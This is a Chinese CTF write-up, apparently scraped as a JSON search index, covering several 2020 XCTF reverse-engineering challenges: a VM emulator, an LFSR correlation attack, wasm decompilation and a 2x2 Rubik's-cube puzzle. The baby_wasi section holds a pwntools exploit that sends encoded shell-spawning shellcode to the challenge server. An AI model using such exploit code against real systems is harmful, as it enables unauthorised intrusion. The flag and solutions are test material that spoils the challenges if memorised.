3e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e]\" input_ptr = 0 bit_add = 0 bf2asm(s,0,'') ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:3:2","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"easyparser 这道题是做出来让我最高兴的一道题(xiaoku.jpg)主要是查了一下发现用了Rust,Rust代码里面会多了很多安全检查的部分来扰乱一下视线(比如说做加法之前会检查加法会不会溢出),去掉这些安全检查的部分之后倒是挺容易看出来解释器的逻辑,之后就是体力活了== wp里面有句话记录一下，或许以后出题用得着呢嘻嘻 一个vm逆向题目，在.init_array中初始化了一部分数据，在.fin_array中进行flag的检查，由于Rust编程 规范不允许在main前和main后编写逻辑，所以先用Rust写了一个so库，用c语言进行一次包裹 逆出来以后可以看出来流程，第一层用来检查输入长度等于38，第二层将输入的中间部分，左移2后与99异或等于特定值.下面是反编译的代码 data = [0, 0, 18, 1, 1, 18, 2, 2, 18, 3, 3, 18, 6, 6, 18, 7, 7, 18, 0, 105, 1, 1, 110, 1, 2, 112, 1, 3, 117, 1, 6, 116, 1, 7, 32, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 7, 0, 24, 0, 102, 1, 1, 108, 1, 2, 97, 1, 3, 103, 1, 6, 58, 1, 7, 32, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 7, 0, 24, 1, 1, 18, 0, 0, 23, 0, 0, 5, 1, 1, 7, 1, 38, 26, 31, 0, 30, 0, 0, 25, 0, 0, 6, 0, 125, 26, 18, 0, 28, 0, 98, 1, 1, 121, 1, 2, 101, 1, 3, 126, 1, 6, 126, 1, 7, 126, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 7, 0, 24, 0, 10, 1, 0, 0, 24, 0, 0, 25, 8, 256, 1, 8, 225, 26, 25, 0, 30, 0, 0, 6, 8, 0, 4, 8, 1, 9, 19, 0, 29, 0, 0, 6, 0, 123, 26, 3, 0, 31, 0, 0, 6, 0, 103, 26, 3, 0, 31, 0, 0, 6, 0, 97, 26, 3, 0, 31, 0, 0, 6, 0, 108, 26, 3, 0, 31, 0, 0, 6, 0, 102, 26, 3, 0, 31, 9, 9, 18, 10, 225, 1, 7, 9, 3, 6, 10, 3, 6, 99, 17, 6, 2, 13, 6, 7, 27, 3, 0, 31, 9, 1, 7, 10, 1, 7, 9, 32, 26, 42, 0, 30, 0, 99, 1, 1, 111, 1, 2, 114, 1, 3, 114, 1, 6, 101, 1, 7, 99, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24] qword_6C09B8 = [144, 332, 28, 240, 132, 60, 24, 64, 64, 240, 208, 88, 44, 8, 52, 240, 276, 240, 128, 44, 40, 52, 8, 240, 144, 68, 48, 80, 92, 44, 264, 240] + [0]*1248 qword_6BF1B8 = [0] * 768 EIP = 0x1f qword_6BF130 = [0x66, 0, 0x61, 0x67] + [0]*100 qword_6BF150 = 0x100 flag = \"flag{G0ertyuiopasdfghjklzxcvbnmoooouu}\" index = 0 while True: opcode = data[EIP * 3 + 2] arg1 = data[EIP * 3] arg2 = data[EIP * 3 + 1] EIP = EIP + 1 if opcode == 25: print \"exit\",25 # print qword_6BF1B8 if index == 38: data = [0, 0, 6, 0, 125, 26, 18, 0, 28, 0, 98, 1, 1, 121, 1, 2, 101, 1, 3, 126, 1, 6, 126, 1, 7, 126, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 7, 0, 24, 0, 10, 1, 0, 0, 24, 0, 0, 25, 8, 256, 1, 8, 225, 26, 25, 0, 30, 0, 0, 6, 8, 0, 4, 8, 1, 9, 19, 0, 29, 0, 0, 6, 0, 123, 26, 3, 0, 31, 0, 0, 6, 0, 103, 26, 3, 0, 31, 0, 0, 6, 0, 97, 26, 3, 0, 31, 0, 0, 6, 0, 108, 26, 3, 0, 31, 0, 0, 6, 0, 102, 26, 3, 0, 31, 9, 9, 18, 10, 225, 1, 7, 9, 3, 6, 10, 3, 6, 99, 17, 6, 2, 13, 6, 7, 27, 3, 0, 31, 9, 1, 7, 10, 1, 7, 9, 32, 26, 42, 0, 30, 0, 99, 1, 1, 111, 1, 2, 114, 1, 3, 114, 1, 6, 101, 1, 7, 99, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 7, 0, 24, 0, 116, 1, 1, 108, 1, 2, 121, 1, 3, 33, 1, 6, 10, 1, 0, 0, 24, 1, 0, 24, 2, 0, 24, 3, 0, 24, 6, 0, 24, 0, 0, 25] EIP = 0 index = 0 else: break elif opcode == 0: v31 = qword_6BF130[arg1] qword_6C09B8[v31] = arg2 print \"v31 = qword_6BF130[\",arg1,\"]\" print \"qword_6C09B8[\",v31,\"] = \",arg2 elif opcode == 1: print \"qword_6BF130[\",arg1,\"] = \",arg2 qword_6BF130[arg1] = arg2 elif opcode == 2: qword_6BF130[arg1] = qword_6BF130[arg2] print \"qword_6BF130[\",arg1,\"] = qword_6BF130[\",arg2,\"];\" elif opcode == 3: v29 = qword_6BF130[arg2] qword_6BF130[arg1] = qword_6C09B8[v29] print \"v29 = qword_6BF130[\",arg2,\"]\" print \"qword_6BF130[\",arg1,\"] = qword_6C09B8[\",v29,\"]\" elif opcode == 4: v30 = qword_6BF130[arg1] qword_6C09B8[v30] = qword_6BF130[arg2] print \"v30 = qword_6BF130[\",arg1,\"]\" print \"qword_6C09B8[\",v30,\"] = qword_6BF130[\",arg2,\"]\" elif opcode == 5: qword_6BF150 += 1 qword_6BF1B8[qword_6BF150] = qword_6BF130[arg1] print \"qword_6BF150 = qword_6BF150 + 1\" print \"qword_6BF1B8[\",qword_6BF150,\"] = qword_6BF130[\",arg1,\"]\" elif opcode == 6: qword_6BF130[arg1] = qword_6BF1B8[qword_6BF150] qword_6BF150 = qword_6BF150 - 1 print \"qword_6BF130[\",arg1,\"] = qword_6BF1B8[\",qword_6BF150,\"]\" print \"qword_6BF150 = qword_6BF150 - 1\" elif opcode == 7: qword_6BF130[arg1] += arg2 print \"qword_6BF130[\",arg1,\"] += \",arg2 elif opcode == 8: v28 = qword_6BF130[arg2] qword_6BF130[arg1] += v28 print \"v28 = qword_6BF130[\",arg2,\"]\" print \"qword_6BF130[\",arg1,\"] += \",v28 e","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:4:0","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"clock 从这里开始都是我不会的题== 这个题的加密流程很容易能看出来,但是我不会解…后来师父来了很快就做出来了略(Helica好厉害好厉害我好菜我好菜),wp中说是穷举钟控的寄存器初态，对另外两个寄存器快速相关攻击。 程序实现了一个时钟控制的非线性移位寄存器，由一个lfsr控制另外两个lfsr的输出。 x = n1 ? n3 : n2 用相关性攻击，先分析输出与三个lfsr的关系，可知输出与n2和n3相同的概率是0.75，和n1相同的概率是0.5。先分别爆破猜出n2和n3，之后再爆破推出n1。 def lfsr_1(R, mask): output = (R \u003c\u003c 1) \u0026 0x1fffff i = (R \u0026 mask) \u0026 0x1fffff lastbit = 0 while i != 0: lastbit ^= (i \u0026 1) i = i \u003e\u003e 1 output ^= lastbit return (output, lastbit) def lfsr_2(R, mask): output = (R \u003c\u003c 1) \u0026 0x3fffff i = (R \u0026 mask) \u0026 0x3fffff lastbit = 0 while i != 0: lastbit ^= (i \u0026 1) i = i \u003e\u003e 1 output ^= lastbit return (output, lastbit) def lfsr_3(R, mask): output = (R \u003c\u003c 1) \u0026 0x7fffff i = (R \u0026 mask) \u0026 0x7fffff lastbit = 0 while i != 0: lastbit ^= (i \u0026 1) i = i \u003e\u003e 1 output ^= lastbit return (output, lastbit) def single_round(R1, R1_mask, R2, R2_mask, R3, R3_mask): (R1_NEW, x1) = lfsr_1(R1, R1_mask) (R2_NEW, x2) = lfsr_2(R2, R2_mask) (R3_NEW, x3) = lfsr_3(R3, R3_mask) return (R1_NEW, R2_NEW, R3_NEW, x3 if x1 == 1 else x2) R1_mask = 0x17FA06 R2_mask = 0x2A9A0D R3_mask = 0x5E5E6A n3 = 23 n2 = 22 n1 = 21 def guess_2(beg, end, num, mask): ansn = range(beg, end) data = open('./output').read(num) data = ''.join(bin(256 + ord(c))[3:] for c in data) now = 0 res = 0 for i in ansn: r = i cnt = 0 for j in range(num * 8): r, lastbit = lfsr_2(r, mask) lastbit = str(lastbit) cnt += (lastbit == data[j]) if cnt \u003e now: now = cnt res = i print now, res, print 'cor rate: %f' % (cnt*1.0 / (num*8)) return res def guess_3(beg, end, num, mask): ansn = range(beg, end) data = open('./output').read(num) data = ''.join(bin(256 + ord(c))[3:] for c in data) now = 0 res = 0 for i in ansn: r = i cnt = 0 for j in range(num * 8): r, lastbit = lfsr_3(r, mask) lastbit = str(lastbit) cnt += (lastbit == data[j]) if cnt \u003e now: now = cnt res = i print now, res, print 'cor rate: %f' % (cnt*1.0 / (num*8)) return res def bruteforce1(y, z): data = open('./output').read(50) data = ''.join(bin(256 + ord(c))[3:] for c in data) for x in range(pow(2, n1 - 1), pow(2, n1)): R1, R2, R3 = x, y, z flag = True for i in range(len(data)): (R1, R2, R3, out) = single_round(R1, R1_mask, R2, R2_mask, R3, R3_mask) if str(out) != data[i]: flag = False break if y % 10000 == 0: print 'now: ', x, y, z if flag: print 'ans: ', hex(x)[2:], hex(y)[2:], hex(z)[2:] break #R2 = guess_2(pow(2, n2 - 1), pow(2, n2), 50, R2_mask) R2 = 3324079 print R2 #R3 = guess_3(pow(2, n3 - 1), pow(2, n3), 50, R3_mask) R3 = 4958299 print R3 bruteforce1(R2, R3) X1cT34m给了一个c版本的,应该要快很多,记录一下 #include \u003cstdio.h\u003e #include \u003cstdint.h\u003e void lfsr( int init, int mask1, int mask2, uint8_t* seq, int len ) { for(int j = 0; j \u003c len; j++) { uint8_t byte = 0; uint8_t bit = 8; do { uint8_t output = 0; int x = init \u0026 mask1; while (x) { output ^= x \u0026 1; x \u003e\u003e= 1; } init = (output ^ (init \u003c\u003c 1)) \u0026 mask2; byte = (byte \u003c\u003c 1) ^ output; bit--; } while (bit); seq[j] = byte; } } double correlation( uint8_t* A, uint8_t* B, int len ) { int N = len * 8; int d = 0; for(int i = 0; i \u003c len; i++) { uint8_t bit = 8; uint8_t a = A[i]; uint8_t b = B[i]; do { if ((a \u0026 1) == (b \u0026 1)) d++; a \u003e\u003e= 1; b \u003e\u003e= 1; bit--; } while (bit); } return (double)d / N; } uint8_t mixed_output[] = { 95, 83, 107, 255, 209, 96, 188, 166, 230, 219, 223, 72, 150, 155, 169, 138, 126, 0, 91, 20, 19, 109, 82, 12, 249, 91, 39, 107, 104, 55, 207, 65, 155, 197, 204, 81, 76, 22, 83, 208, 215, 13, 254, 14, 43, 87, 29, 42, 161, 92, 2, 109, 110, 232, 201, 147, 19, 53, 216, 82, 144, 169, 34, 193, 106, 0, 253, 224, 7, 46, 24, 16, 226, 127, 164, 162, 54, 98, 144, 141, 182, 174, 252, 64, 130, 19, 163, 242, 176, 78, 79, 3, 19, 11, 160, 121, 149, 44, 53, 17, }; // 100 void guess2( ) { int len = 100; uint8_t seq[100] = {}; int possible_r2 = 0; double max_p = 0.0; int r2; for (r2 = 0; r2 \u003c (1\u003c\u003c22); r2++) { lfsr(r2, 0x2A9A0D, 0x3FFFFF, seq, 100); double corr = correlation(seq, mixed_output, len); if (corr \u003e max_p) { possible_r2 = r2; max_p = corr; } } printf(\"%d %f\", possible_r2, max_p); // 3324079 } void guess3( ) { int len = 100; uint8_t ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:5:0","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"baby_wasi 趁着这道题好好学习了一下wasm,感觉收获还挺多的(Helica tql tql tql) ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:6:0","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"反编译wasm 这道题用了wasmer-c-api来构建,主程序为baby_wasi,program.wasm为子程序,主要处理字符串变换逻辑.首先对program.wasm逆向分析.基础教程: 一种Wasm逆向静态分析方法 反汇编的话，可以用wasm2wat把wasm反汇编成wat，https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format 这里面对wat进行了一些解释 还可以把wasm转成c语言的格式，用wasm2c $ ./wasm2c wasm.wasm -o wasm.c ==\u003e 得到wasm.c和wasm.h 但是因为生成的c语言很长而且基本跟看wat没什么区别，所以需要再编译成二进制文件放到ida里面去看 将之前反编译出来的wasm.c，wasm.h，以及wabt项目内的wasm-rt.h，wasm-rt-impl.c，wasm-rt-impl.h三个文件放到同一个文件夹。 直接gcc wasm.c会报错，因为很多wasm的函数没有具体的实现。但是我们可以只编译不链接，我们关心的只是程序本身的逻辑，不需要真正编译出能运行的elf来。 $ gcc -c wasm.c -o wasm.o 得到的还未连接的elf文件wasm.o, 将wasm.o放到ida里面分析会比较清楚一些。 ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:6:1","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"查找main函数 从反编译的代码里面可以看到有_start函数,然后需要从这一堆函数里面找到关键函数…对于wasm，所有的字符串会被存放在二进制文件的末尾，而且wasm并不是直接对地址的引用，想找到这些字符串会比较困难。Nu1L的wp里面说识别出来malloc,free,exit这些函数然后才推测出来main函数的位置,我在谷歌上找到了一份保留函数名称的代码，可以对照着识别出来main函数，函数如下: static void _start(void) { u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0; FUNC_PROLOGUE; u32 i0, i1, i2; i0 = g0; i1 = 16u; i0 -= i1; l0 = i0; g0 = i0; __wasilibc_init_preopen(); i0 = 3u; l1 = i0; L1: i0 = l1; i1 = l0; i0 = (*Z_wasi_unstableZ_fd_prestat_getZ_iii)(i0, i1); l2 = i0; i1 = 8u; i0 = i0 \u003e i1; if (i0) {goto B0;} i0 = l2; switch (i0) { case 0: goto B3; case 1: goto B0; case 2: goto B0; case 3: goto B0; case 4: goto B0; case 5: goto B0; case 6: goto B0; case 7: goto B0; case 8: goto B2; default: goto B3; } B3:; i0 = l0; i0 = i32_load8_u((\u0026memory), (u64)(i0)); if (i0) {goto B4;} i0 = l0; i0 = i32_load((\u0026memory), (u64)(i0 + 4)); i1 = 1u; i0 += i1; i0 = malloc(i0); l2 = i0; i0 = !(i0); if (i0) {goto B0;} i0 = l1; i1 = l2; i2 = l0; i2 = i32_load((\u0026memory), (u64)(i2 + 4)); i0 = (*Z_wasi_unstableZ_fd_prestat_dir_nameZ_iiii)(i0, i1, i2); i0 = !(i0); if (i0) {goto B5;} i0 = l2; free(i0); goto B0; B5:; i0 = l2; i1 = l0; i1 = i32_load((\u0026memory), (u64)(i1 + 4)); i0 += i1; i1 = 0u; i32_store8((\u0026memory), (u64)(i0), i1); i0 = l1; i1 = l2; i0 = __wasilibc_register_preopened_fd(i0, i1); l3 = i0; i0 = l2; free(i0); i0 = l3; if (i0) {goto B0;} B4:; i0 = l1; i1 = 1u; i0 += i1; l2 = i0; i1 = l1; i0 = i0 \u003c i1; l3 = i0; i0 = l2; l1 = i0; i0 = l3; i0 = !(i0); if (i0) {goto L1;} B2:; i0 = l0; i1 = l0; i2 = 12u; i1 += i2; i0 = (*Z_wasi_unstableZ_environ_sizes_getZ_iii)(i0, i1); if (i0) {goto B8;} i0 = 0u; i1 = l0; i1 = i32_load((\u0026memory), (u64)(i1)); i2 = 2u; i1 \u003c\u003c= (i2 \u0026 31); i2 = 4u; i1 += i2; i1 = malloc(i1); i32_store((\u0026memory), (u64)(i0 + 1528), i1); i0 = l0; i0 = i32_load((\u0026memory), (u64)(i0 + 12)); i0 = malloc(i0); l1 = i0; i0 = !(i0); if (i0) {goto B8;} i0 = 0u; i0 = i32_load((\u0026memory), (u64)(i0 + 1528)); l2 = i0; i0 = !(i0); if (i0) {goto B8;} i0 = l2; i1 = l0; i1 = i32_load((\u0026memory), (u64)(i1)); i2 = 2u; i1 \u003c\u003c= (i2 \u0026 31); i0 += i1; i1 = 0u; i32_store((\u0026memory), (u64)(i0), i1); i0 = 0u; i0 = i32_load((\u0026memory), (u64)(i0 + 1528)); i1 = l1; i0 = (*Z_wasi_unstableZ_environ_getZ_iii)(i0, i1); if (i0) {goto B8;} i0 = l0; i1 = 12u; i0 += i1; i1 = l0; i0 = (*Z_wasi_unstableZ_args_sizes_getZ_iii)(i0, i1); if (i0) {goto B7;} i0 = l0; i0 = i32_load((\u0026memory), (u64)(i0 + 12)); l1 = i0; if (i0) {goto B10;} goto B9; B10:; i0 = l1; i1 = 2u; i0 \u003c\u003c= (i1 \u0026 31); i1 = 4u; i0 += i1; i0 = malloc(i0); l1 = i0; i0 = l0; i0 = i32_load((\u0026memory), (u64)(i0)); i0 = malloc(i0); l2 = i0; i0 = l1; i0 = !(i0); if (i0) {goto B7;} i0 = l2; i0 = !(i0); if (i0) {goto B7;} i0 = l1; i1 = 0u; i32_store((\u0026memory), (u64)(i0), i1); i0 = l1; i1 = l2; i0 = (*Z_wasi_unstableZ_args_getZ_iii)(i0, i1); if (i0) {goto B7;} B9:; __wasm_call_ctors(); i0 = l0; i0 = i32_load((\u0026memory), (u64)(i0 + 12)); i1 = l1; i0 = main(i0, i1); l1 = i0; __prepare_for_exit(); i0 = l1; if (i0) {goto B6;} i0 = l0; i1 = 16u; i0 += i1; g0 = i0; goto Bfunc; B8:; i0 = 71u; _Exit(i0); UNREACHABLE; B7:; i0 = 71u; _Exit(i0); UNREACHABLE; B6:; i0 = l1; _Exit(i0); UNREACHABLE; B0:; i0 = 71u; _Exit(i0); UNREACHABLE; Bfunc:; FUNC_EPILOGUE; } 然后根据这个可以识别出来main函数，找到main函数以后就比较好找关键函数的位置了，关键函数如下: __int64 real_main() { unsigned int v0; // ST38_4 unsigned int v1; // eax unsigned int c; // ST2C_4 int v3; // ST30_4 int v5; // [rsp+18h] [rbp-28h] unsigned int v7; // [rsp+1Ch] [rbp-24h] unsigned int lucky_num; // [rsp+20h] [rbp-20h] if ( ++wasm_rt_call_stack_depth \u003e 0x1F4u ) wasm_rt_trap(7LL); g0 -= 96; v7 = g0; v5 = 0; v0 = f28(0); f88(v0); lucky_num = (signed int)f89() % 10000; i32_store(\u0026memory, v7 + 16, lucky_num); f40(1024LL, v7 + 16); // Your lucky number: %d\\n i32_store(\u0026memory, v7, v7 + 32); f69(1047u, v7); // %64s while ( v5 != 64 ) { c = i32_load8_u(\u0026memory, v5 + v7 + 32); v3 = get_lucky(v5 + lucky_num); i32_store8(\u0026memory, v5++ + v7 + 32, v3 ^ c); } Z_envZ_boomZ_vii(v7 + 32, 64LL); // 调用boom函数 v1 = i32_load(\u0026memory, 3416LL); ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:6:2","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"wasmer-c-api 主程序baby_wasi加载并执行program.wasm，其中baby_wasi是使用了一些wasmer-c-api来执行wasm的，需要了解一下这些api的含义才能更好的理解程序执行过程. wasmer-c-api的手册https://docs.rs/wasmer-runtime-c-api/0.16.2/wasmer_runtime_c_api/ 找到了一个使用wasmer-c-api执行wasm的例子，对照这个例子理解一下： #include \u003cstdio.h\u003e #include \"../wasmer.h\" #include \u003cassert.h\u003e #include \u003cstdint.h\u003e #include \u003cstring.h\u003e typedef struct { int32_t amount; int32_t value; } counter_data; typedef struct { uint8_t* bytes; long bytes_len; } wasm_file_t; wasm_file_t read_wasm_file(const char* file_name) { wasm_file_t wasm_file; FILE *file = fopen(file_name, \"r\"); fseek(file, 0, SEEK_END); wasm_file.bytes_len = ftell(file); wasm_file.bytes = malloc(wasm_file.bytes_len); fseek(file, 0, SEEK_SET); fread(wasm_file.bytes, 1, wasm_file.bytes_len, file); fclose(file); return wasm_file; } void inc_counter(wasmer_instance_context_t *ctx) { counter_data* data = (counter_data*)wasmer_instance_context_data_get(ctx); data-\u003evalue = data-\u003evalue + data-\u003eamount; } void mul_counter(wasmer_instance_context_t *ctx) { counter_data* data = (counter_data*)wasmer_instance_context_data_get(ctx); data-\u003evalue = data-\u003evalue * data-\u003eamount; } int32_t get_counter(wasmer_instance_context_t *ctx) { counter_data* data = (counter_data*)wasmer_instance_context_data_get(ctx); return data-\u003evalue; } counter_data *init_counter(int32_t value, int32_t amount) { counter_data* counter = malloc(sizeof(counter_data)); counter-\u003evalue = value; counter-\u003eamount = amount; return counter; } wasmer_import_t create_import(char* module_name, char* import_name, wasmer_import_func_t *func) { wasmer_import_t import; wasmer_byte_array module_name_bytes; wasmer_byte_array import_name_bytes; module_name_bytes.bytes = (const uint8_t *) module_name; module_name_bytes.bytes_len = strlen(module_name); import_name_bytes.bytes = (const uint8_t *) import_name; import_name_bytes.bytes_len = strlen(import_name); import.module_name = module_name_bytes; import.import_name = import_name_bytes; import.tag = WASM_FUNCTION; import.value.func = func; return import; } int main() { // Prepare Imports wasmer_value_tag inc_params_sig[] = {}; wasmer_value_tag inc_returns_sig[] = {}; //把inc_counter函数加载到wasm的env中并命名位inc wasmer_import_func_t *inc_func = wasmer_import_func_new((void (*)(void *)) inc_counter, inc_params_sig, 0, inc_returns_sig, 0); wasmer_import_t inc_import = create_import(\"env\", \"inc\", inc_func); wasmer_value_tag mul_params_sig[] = {}; wasmer_value_tag mul_returns_sig[] = {}; //把mul_counter函数加载到wasm的env中并命名位mul wasmer_import_func_t *mul_func = wasmer_import_func_new((void (*)(void *)) mul_counter, mul_params_sig, 0, mul_returns_sig, 0); wasmer_import_t mul_import = create_import(\"env\", \"mul\", mul_func); wasmer_value_tag get_params_sig[] = {}; wasmer_value_tag get_returns_sig[] = {WASM_I32}; //把get_counter函数加载到wasm的env中并命名位get wasmer_import_func_t *get_func = wasmer_import_func_new((void (*)(void *)) get_counter, get_params_sig, 0, get_returns_sig, 1); wasmer_import_t get_import = create_import(\"env\", \"get\", get_func); // Read the wasm file wasm_file_t wasm_file = read_wasm_file(\"inc.wasm\"); // Compile module wasmer_module_t *module = NULL; wasmer_result_t compile_res = wasmer_compile(\u0026module, wasm_file.bytes, wasm_file.bytes_len); assert(compile_res == WASMER_OK); // Prepare Import Object wasmer_import_object_t *import_object = wasmer_import_object_new(); // First, we import `inc_counter` and `mul_counter` wasmer_import_t imports[] = {inc_import, mul_import}; wasmer_result_t extend_res = wasmer_import_object_extend(import_object, imports, 2); assert(extend_res == WASMER_OK); // Now, we'll import `inc_counter` and `mul_counter` wasmer_import_t more_imports[] = {get_import}; wasmer_result_t extend_res2 = wasmer_import_object_extend(import_object, more_imports, 1); assert(extend_res2 == WASMER_OK); // Same `wasmer_import_object_extend` as the first, doesn't affect anything wasmer_result_t extend_res3 = wasmer_import_object_extend(import_object, imports, 2); assert(extend_res3 == WASMER_OK); /","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:6:3","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"exp from pwn import * context.log_level = 'debug' #context.terminal=['tmux','split','-h'] context(arch='amd64', os='linux',log_level='debug') debug = 1 def prime_test(n): if n \u0026 1 and n % 3 : v3 = 7 while (v3 - 6) ** 2 \u003c n: if n % (v3 - 2) : v1 = n % v3 v3 += 6 if v1: continue return 0 return 1 return 0 def invsere_decimal(x): return int(str(x)[::-1]) def is_prime(x): v3 = invsere_decimal(x) if v3 != x and prime_test(x): return prime_test(v3) != 0 return False def next_prime(x): v3 = 0 v4 = 0 v5 = 0 while v4 \u003c x + 1: v6 = is_prime(v3) if v6: v1 = v3 else: v1 = v5 v5 = v1 v3 = v3 + 1 if v6: v4 += 1 return v5 def payload_encode(payload, lck_n): print 'lck:%d' % lck_n rtn = '' for i in xrange(len(payload)): c = ord(payload[i]) ^ (next_prime(lck_n) \u0026 0xff) lck_n += 1 rtn += chr(c) return rtn if debug: p = process('./baby_wasi') else: p = remote('121.37.164.32', 19008) def exp(): #gdb.attach(p, 'b boom') p.recvuntil(\"Your lucky number: \") lckn = int(p.recv()) #payload = '\\xff' * 64 payload = asm(shellcraft.sh()) print \"[+]payload plain: \"+payload payload = payload_encode(payload, lckn) print '[+] payload len: %d' % len(payload) p.sendline(payload) p.interactive() s = raw_input('wait for gdb') exp() ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:6:4","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"Rubik(魔方) 题目是Rubik加上提供了URF三种操作，所以是一个魔方题。然后魔方的状态使用最多9个字节描述，说明是一个2*2的魔方(3*3的魔方至少需要21个字节描述) 在线魔方求解器 OptimalSolver-Nu1L py222-Helica 我感觉helica这个魔方求解器的逻辑要简单一些(Nu1L给的魔方求解器能求出来一些py222不能给的解法),所以我还是用了师父给的,毕竟我研究了挺久只会这个… ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:7:0","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"2*2魔方简介 首先一个标准的魔方是如下结构的： ┌──┬──┐ │ 0│ 1│ ├──┼──┤ │ 2│ 3│ ┌──┬──┼──┼──┼──┬──┬──┬──┐ │16│17│ 8│ 9│ 4│ 5│20│21│ ├──┼──┼──┼──┼──┼──┼──┼──┤ │18│19│10│11│ 6│ 7│22│23│ └──┴──┼──┼──┼──┴──┴──┴──┘ │12│13│ ├──┼──┤ │14│15│ └──┴──┘ 一个魔方分为UDFBRL六个面，按照上面这个标准的魔方展开图来说，891011这个面是F面，0123这个面是U面，4567这个面是R面，然后FUR这三个操作就是分别对应这三个面做顺时针旋转操作(F2指对F面顺时针旋转两次, F’指对F面逆时针旋转一次) ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:7:1","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"py222用法 solver.py里面给出了求解的调用过程 #doAlgStr(state, move)表示对处于state的魔方进行move操作 s = py222.doAlgStr(py222.initState(), \"R U2 R2 F2 R' F2 R F R\") #打印进行上述操作后的魔方状态 py222.printCube(s) #求解,输入s是一个长度为24的整数数组， solveCube(s) ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:7:2","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"魔方还原 明白是一个2*2的魔方之后，主要的难点在于给的状态并不是按照标准魔方状态给的,就是给的9字节状态，转成24长度的数组后，数组的0123位并不对于上面给的魔方标准状态的0123位置,为了还原位置我们需要记录对标准魔方分别做URF后的状态。题目中给的标准状态数字是0xB6D9246DB492249,我们在旋转魔方操作之前将表示状态的内存中的数字修改为0xB6D9246DB492249，然后分别做URF操作，记录操作后的状态 x /2xg addr //按照16进制打印addr处的内容(一个g是8字节) set {long}addr = 0xB6D9246DB492249 //修改addr处的内容 用下面程序还原分别做URF操作后魔方的状态 def printc(c): for i in range(6): print(\"\".join(str(a) for a in c[i*4:i*4+4]),end=\" \") print(\"\\n\") def change_format(b): buf = '' for i in range(72): buf += chr(ord('0') + bool(((1\u003c\u003ci) \u0026 b))) buf = buf[::-1] s = '' for i in range(len(buf)): s += buf[i] if i%3 == 2: s += ' ' # print(s) s = s.split(' ') t = [0] * 24 for x in range(24): tmp = int(s[x], 2) t[x] = tmp return t print(\"init\") c = change_format(0xB6D9246DB492249) printc(c) print(\"after U\") c = change_format(0x0a4db646db912291) printc(c) print(\"after R\") c = change_format(0x900b6d8dc64b492009) printc(c) print(\"after F\") c = change_format(0x09002d924b5b4da249) printc(c) \"\"\" init 0000 5555 4444 3333 2222 1111 after U 0000 5115 5544 3333 4422 1221 after R 4400 5555 4334 3113 2222 0011 after F 0220 0055 4444 5533 2332 1111 \"\"\" 根据上面的结果可以按照字符串顺序还原出这个魔方对应的状态 ┌──┬──┐ │15│14│ ├──┼──┤ │12│13│ ┌──┬──┼──┼──┼──┬──┬──┬──┐ │ 6│ 5│22│21│17│16│ 9│ 8│ ├──┼──┼──┼──┼──┼──┼──┼──┤ │ 7│ 4│23│20│18│19│10│11│ └──┴──┼──┼──┼──┴──┴──┴──┘ │ 2│ 1│ ├──┼──┤ │ 3│ 0│ └──┴──┘ 也就是说，字符串中第0个位置对应py222给出的标准魔方的第15个位置，字符串中第1个位置对应py222给出的标准魔方的第13个位置 然后我们根据字符的顺序，将这些字符填入它们在标准魔方中的对应位置后求解 import py222 import solver def change_format(a, b): buf = '' for i in range(64): buf += chr(ord('0') + bool(((1\u003c\u003ci) \u0026 b))) for i in range(8): buf += chr(ord('0') + bool(((1\u003c\u003ci) \u0026 a))) buf = buf[::-1] #每三比特表示一个面的状态 s = '' for i in range(len(buf)): s += buf[i] if i%3 == 2: s += ' ' print(s) s = s.split(' ') t = [0] * 24 for x in range(24): tmp = int(s[x], 2) t[x] = tmp tbl = [15, 13, 12, 14, 19, 17, 16, 18, 21, 20, 22, 23, 2, 3, 1, 